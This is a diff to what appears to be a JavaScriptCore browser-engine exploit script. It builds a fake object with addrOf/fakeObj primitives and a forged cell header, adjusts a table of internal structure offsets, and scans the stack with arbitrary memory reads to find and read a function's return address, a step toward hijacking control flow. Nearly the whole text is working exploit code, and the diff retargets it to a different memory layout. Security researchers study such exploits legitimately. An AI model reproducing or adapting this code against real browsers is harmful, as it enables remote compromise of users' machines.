@@ -166,8 +166,8 @@ function asDouble(v) {
     */
 
     var container = {
-        jsCellHeader: 1.0089423577546429E-303, // SKIP 1: See article about how to make structure id oracle.
-        butterfly: fakeObj(addrOf(hax) + 8n),
+        jsCellHeader: asDouble(0x010824070052d8a0), // SKIP 1: See article about how to make structure id oracle.
+        butterfly: fakeObj(addrOf(hax) + 4n),
         vector: false,
         lengthAndFlags: false
     };
@@ -290,11 +290,12 @@ function tierUp(o) {
 }
 
 const offsetMap = new Map([
-    ["JSFunction::executableOrRareData", 24n],
+    ["JSFunction::executableOrRareData", 20n],
+    ["FunctionExecutable::m_unlinkedExecutable", 60n],
     ["ExecutableBase::m_jitCodeForCall", 8n],
-    ["JITCode::executableAddress", 24n],
-    ["JSGlobalObject::m_vm", 64n],
-    ["VM::topEntryFrame", 56n],
+    ["JITCode::executableAddress", 20n],
+    ["JSGlobalObject::m_vm", 44n],
+    ["VM::topEntryFrame", 36n],
     ["JSGlobalProxy::m_target", 16n],
 ])
 function offset(field) {
@@ -339,13 +340,8 @@ function derefAssign(o, field, val) {
 
 // -------------------------------------------------------------------------
 
-let fnA = () => { p("A") }
-
-inspectCell(fnA)
-p("---")
-
-if (verbose)
-    $vm.dumpRegisters()
+//if (verbose)
+//    $vm.dumpRegisters()
 
 let stack = deref(globalThis, "JSGlobalProxy::m_target.JSGlobalObject::m_vm.VM::topEntryFrame")
 p("A stack address:")
@@ -358,23 +354,28 @@ function findReturnAddress(a, b, c, d, e, f, g, h, i, j, k, l) {
         $vm.dumpRegisters()
 
     let myStack = 0
-    for (let i = stack; ; i -= 16n) {
+    let fail = 0
+    for (let i = stack; ; i -= 8n) {
         output = false
         let a = read64(i)
         let b = read64(i + 8n)
         output = true
 
-        if (a == 0xfffe0000000000bfn && b == 0xfffe0000000000efn) {
+        if (a == 0xffffffff000000bfn && b == 0xffffffff000000efn) {
             myStack = i
             break
         }
+        
+        ++fail
+        if (fail > 1000)
+            throw "Failed to find stack"
     }
 
     p("Found my stack: ")
     hd(myStack)
 
     p("Found ret pc at:")
-    let retPC = myStack - 0x7fffd8f05240n + 0x7fffd8f05218n
+    let retPC = myStack - 0xb31fff30n + 0xb31fff10n
     hd(retPC)
     hd(read64(retPC))
 
